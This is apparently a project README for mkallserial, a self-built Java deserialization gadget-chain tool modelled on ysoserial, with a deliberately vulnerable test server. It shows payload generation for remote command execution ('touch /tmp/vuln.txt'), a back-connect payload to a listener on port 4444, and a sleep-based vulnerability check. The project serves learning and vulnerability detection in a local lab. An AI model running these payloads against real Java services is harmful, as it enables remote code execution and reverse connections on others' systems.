# mkallserial

## Summary

Serialization is a process during which an object in a programming language is converted into a format that can be saved to the database or transferred over a network. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.

If the application does unsafe deserialization and we as an attacker can modify the object before it's deserialized we can abuse "gadget chains" discovered in common java libraries in the classpath and under the right conditions abuse that to invoke commands on the application host.

## Description

mkallserial is an vulnerable application that does unsafe deserialization and a collection of utilities and "gadget chains" discovered in common libraries for abuse deserialization vulnerabilities. It is heavily inspired by ysoserial and is written by me as I wanted to get a better understanding of how java unsafe serialization works and how to write gadget chains myself. As due, I have used ysoserial with great success before and I have a basic understanding of the concept and how it works I felt the gadget chains was a bit of black magic. Often just fire and it works. So this project is for me to learn this once and for all. Also, there will be gadget chains that do not exist in ysoserial that will help a lot in detecting these vulnerabilities as making the application sleep or test that the firewall allow outbound access.

## Vulnerable application

Have created a vulnerable application that does unsafe deserialization on port 8000. Just send a payload to this port and the application will try to deserialize it.

First, you need to build and start the application. That can be done by typing these commands

```sh
⬢  mkallserial  master ⦿ docker-compose build
Building vulnserver
Step 1/10 : FROM gradle:7.3.1-jdk17-alpine AS builder
 ---> 45639f500c78
Step 2/10 : COPY --chown=gradle:gradle . /home/gradle/src
 ---> 6aa3be75535b
Step 3/10 : WORKDIR /home/gradle/src
 ---> Running in 9f86986a7632
Removing intermediate container 9f86986a7632
 ---> e0087ba78799
Step 4/10 : RUN gradle build --no-daemon
 ---> Running in 90f4175fb5fa

Welcome to Gradle 7.3.1!

Here are the highlights of this release:
 - Easily declare new test suites in Java projects
 - Support for Java 17
 - Support for Scala 3

For more details see https://docs.gradle.org/7.3.1/release-notes.html

To honour the JVM settings for this build a single-use Daemon process will be forked. See https://docs.gradle.org/7.3.1/userguide/gradle_daemon.html#sec:disabling_the_daemon.
Daemon will be stopped at the end of the build 
> Task :compileJava
> Task :processResources NO-SOURCE
> Task :classes
> Task :jar
> Task :startScripts
> Task :distTar
> Task :distZip
> Task :assemble
> Task :compileTestJava NO-SOURCE
> Task :processTestResources NO-SOURCE
> Task :testClasses UP-TO-DATE
> Task :test NO-SOURCE
> Task :check UP-TO-DATE
> Task :build

BUILD SUCCESSFUL in 6s
5 actionable tasks: 5 executed
Removing intermediate container 90f4175fb5fa
 ---> 4cc5f1ac0d5c
Step 5/10 : FROM openjdk:8u181-jdk-alpine
 ---> 04060a9dfc39
Step 6/10 : EXPOSE 8000
 ---> Using cache
 ---> 2bb7e0ce3bc4
Step 7/10 : RUN mkdir /app
 ---> Using cache
 ---> c8f1e9035659
Step 8/10 : RUN apk add python
 ---> Using cache
 ---> 22febbdde723
Step 9/10 : COPY --from=builder /home/gradle/src/build/libs/*.jar /app/app.jar
 ---> bc6d4aaa8008
Step 10/10 : CMD ["java", "-jar", "/app/app.jar"]
 ---> Running in c21bb78d5f7a
Removing intermediate container c21bb78d5f7a
 ---> 031f228d2e35
Successfully built 031f228d2e35
Successfully tagged mkallserial_vulnserver:latest
```

Start the vulnerable application

```sh
⬢  mkallserial  master ⦿ docker-compose up -d
Recreating mkallserial_vulnserver_1 ... done

⬢  mkallserial  master ⦿ docker ps

CONTAINER ID   IMAGE                    COMMAND                  CREATED         STATUS                  PORTS                                       NAMES
5b439be5e2dc   mkallserial_vulnserver   "java -jar /app/app.…"   2 seconds ago   Up Less than a second   0.0.0.0:8000->8000/tcp, :::8000->8000/tcp   mkallserial_vulnserver_1
```

## Normal behaviour

For test the normal serialization behaviour, you can use dump argument to make the application save the serialised `object.ser` to disk 

```sh
⬢  mkallserial  master ⦿ java -jar docker/commons-vulnerable-app/build/libs/commons-vulnerable-app-0.0.1-SNAPSHOT.jar dump
Serialized data saved to object.ser
```

Then send the object to the server.

```sh
cat object.ser | nc 127.0.0.1 8000
```

If check the logs on application, you know can see the object was deserialized as it was intended.

```sh
⬢  mkallserial  master ⦿ docker logs 5b
The desert: Message
```

## Payloads

As it is very time-consuming to create payloads we only have these at the moment but the plan is to add more gadgets. 

| Payload                          | Description                        |
| -------------------------------- | ---------------------------------- |
| BackConnectCommonsCollections5   | Back connect for test firewall     |
| CommonsCollections5              | Remote code execution payload      |
| SleepCommonsCollection5          | Sleep 5 seconds payload            |


## Build mkallserial.jar


Run `make` and it will run the maven command that builds and package the jar file.

```sh
⬢  mkallserial  master ⦿ make
mvn package -DskipTests
[INFO] Scanning for projects.....
```

Then run the jar to see what classes and payloads are available.

```sh
⬢  mkallserial  master ⦿ java -jar target/mkallserial.jar

Not implmented:

Use classpath for access payloads

java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.SleepCommonsCollections5
java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.CommonsCollections5 "<command>"
java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.BackConnectCommonsCollections5 "<address>" "<port>"
```

## Examples

Here is a standard check if the application sleeps for 5 seconds its vulnerable

```sh
⬢  mkallserial  master ⦿ time java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.SleepCommonsCollections5 |nc 127.0.0.1 8000
java -cp target/mkallserial.jar   0.09s user 0.02s system 155% cpu 0.072 total
nc 127.0.0.1 8000  0.00s user 0.00s system 0% cpu 5.071 total
```

Remote code execution, as can see the command 'touch /tmp/vuln.txt' was run. 

```sh
⬢  mkallserial  master ⦿ java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.CommonsCollections5 "touch /tmp/vuln.txt" |nc 127.0.0.1 8000

⬢  mkallserial  master ⦿ docker exec -it 5b4 /bin/sh -c 'ls /tmp'
hsperfdata_root  vuln.txt
```

Testing firewall with backconnect payload. 

```sh
⬢  mkallserial  master ⦿ java -cp target/mkallserial.jar com.kindredgroup.mkallserial.payloads.BackConnectCommonsCollections5 192.168.1.75 4444 |nc 127.0.0.1 8000
```

And we got a connection on our listener.

```sh
⬢  ~  nc -lnvp 4444                           
Connection from 172.21.0.2:59866
```

## Scripts

Here is a script using the sleep gadget to check if component is vulnerable

```sh
⬢  scripts  master ⦿ ./isvuln.py 127.0.0.1 8000
[+] Vulnerable
⬢  scripts  master ⦿ ./isvuln.py 127.0.0.1 8001
[-] Not vulnerable
```


## Demo

[![asciicast](https://asciinema.org/a/vx62qBV6c0VMmVPdvEouz2Xnz.svg)](https://asciinema.org/a/vx62qBV6c0VMmVPdvEouz2Xnz)